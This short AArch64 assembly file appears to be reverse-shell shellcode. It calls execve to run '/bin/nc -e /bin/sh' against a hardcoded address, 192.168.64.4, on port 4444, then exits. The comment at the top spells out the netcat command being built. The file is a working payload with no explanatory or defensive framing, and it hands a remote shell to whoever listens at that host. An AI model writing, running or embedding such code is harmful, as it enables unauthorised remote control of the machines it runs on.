.global _start
.section .text


// execve("/bin/nc", {"/bin/nc", "-e", "/bin/sh", "ip", "port", NULL}, NULL)
_start:
	adr x0, nc_path
	mov x1, sp
	str x0, [x1]
	adr x2, e_flag
	str x2, [x1, #8]
	adr x2, shell_path
	str x2, [x1, #16]
	adr x2, ip_addr
	str x2, [x1, #24]
	adr x2, port
	str x2, [x1, #32]
	mov x2, #0
	str x2, [x1, #40]

	mov x2, #0
	mov x8, #221
	svc #0

	mov x8, #93
	mov x0, #0
	svc #0

nc_path:
	.asciz "/bin/nc"
e_flag:
	.asciz "-e"
shell_path:
	.asciz "/bin/sh"
ip_addr:
	.asciz "192.168.64.4"
port:
	.asciz "4444"
